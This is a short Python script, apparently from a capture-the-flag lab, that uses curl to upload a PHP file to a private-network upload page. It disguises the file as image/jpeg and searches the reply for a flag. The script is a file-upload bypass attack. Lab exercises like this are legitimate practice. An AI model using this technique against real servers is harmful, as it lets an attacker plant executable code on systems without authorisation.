import os

class UploadFile():
    '''
        File upload class runs a curl script to the "http://192.168.1.100/?page=upload" page
        Using curl with the -F flag lets curl emulate a filled-in form in which a user has pressed the submit button

        This enables uploading of binary files etc. To force the 'content' part to be a file.  

        In our case we are uploading a .php file
    '''
    def upload():
        os.system("curl -X POST -F 'Upload=Upload' -F 'uploaded=@file.php;type=image/jpeg' \"http://192.168.1.99/?page=upload\" | grep \"flag\"")


UploadFile.upload()